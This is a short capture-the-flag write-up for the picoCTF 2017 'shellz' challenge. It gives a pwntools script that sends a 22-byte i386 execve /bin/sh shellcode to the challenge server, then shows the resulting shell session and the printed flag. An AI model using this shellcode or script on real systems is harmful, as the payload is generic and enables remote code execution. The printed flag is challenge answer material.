### Solved by superkojiman

Yet another shellcoding challenge. This one reads 40 bytes of data but no longer has a win() function to return to. No problme, just send it our own execve shellcode

```
#!/usr/bin/env python

from pwn import *

r = remote("shell2017.picoctf.com",12169)

context(os="linux", arch="i386")
buf = "jhh///sh/bin\x89\xe31\xc9j\x0bX\x99\xcd\x80"

print "len buf:", len(buf)
open("in.txt", "w").write(buf)


print r.recv()
r.sendline(buf)
r.interactive()
```

And the output

```
root|picoctf|~/work/level2/pwn/shellz
$ ./sploit.py
[+] Opening connection to shell2017.picoctf.com on port 12169: Done
len buf: 22
My mother told me to never accept things from strangers
How bad could running a couple bytes be though?

[*] Switching to interactive mode
Give me 40 bytes:
$ ls
flag.txt
shellz
shellz_no_aslr
xinetd_wrapper.sh
$ cat flag.txt
4c34815c5a51fdcc58220e27e7d46521
```
